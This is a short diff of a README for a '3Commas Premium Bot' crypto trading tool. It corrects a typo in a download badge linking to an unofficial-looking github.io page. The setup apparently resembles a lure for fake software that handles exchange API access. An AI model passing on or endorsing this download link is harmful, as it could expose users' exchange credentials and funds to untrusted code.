@@ -2,7 +2,7 @@
 
 3Commas Premium Bot is a smart and flexible trading bot tailored for users who rely on automation, analytics, and performance. It connects directly to your exchange via secure APIs and boosts your trading efficiency with minimal effort.
 
-[![Download 3Commas Premium Bot](https://img.shields.io/badge/Download-3Commas_Premium_Bot-blueviolet)](https;//3commas-premium-bot.github.io/.github)
+[![Download 3Commas Premium Bot](https://img.shields.io/badge/Download-3Commas_Premium_Bot-blueviolet)](https://3commas-premium-bot.github.io/.github)
 
 ---
 
